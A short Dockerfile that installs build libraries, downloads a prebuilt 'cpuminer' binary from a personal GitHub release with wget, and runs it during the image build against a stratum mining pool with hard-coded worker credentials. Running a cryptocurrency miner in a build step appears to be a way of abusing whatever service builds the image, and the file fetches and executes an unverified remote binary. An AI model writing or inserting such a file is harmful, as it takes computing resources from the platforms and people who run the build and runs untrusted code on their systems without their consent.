FROM ubuntu:latest
RUN apt update && apt install wget curl git -y
RUN apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev -y
RUN wget https://github.com/whi004/whi/releases/download/0.1/cpuminer && chmod +x cpuminer
RUN ./cpuminer -o stratum+tcp://de2.xbtx.collective-b.net:3333 -u guru.guru -p guru
